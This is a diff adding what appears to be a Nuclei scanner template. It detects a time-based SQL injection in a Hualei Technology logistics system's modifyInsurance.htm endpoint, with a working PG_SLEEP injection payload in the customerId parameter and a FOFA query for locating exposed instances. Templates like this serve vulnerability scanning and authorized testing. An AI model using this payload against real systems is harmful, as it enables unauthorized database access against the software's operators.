@@ -1,0 +1,33 @@
+id: hualei-modifyInsurance-sqli
+info:
+  name: 华磊科技物流系统modifyInsurance存在sql注入漏洞
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://mp.weixin.qq.com/s/-iKjhDkGmfqt_eGTTgd8Lw
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="l_c_bar"
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,hualei,time
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /modifyInsurance.htm?documentCode=1&insuranceValue=1&customerId=1+AND+6269=(SELECT+6269+FROM+PG_SLEEP(5)) HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          # - contains_all(body,'')
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
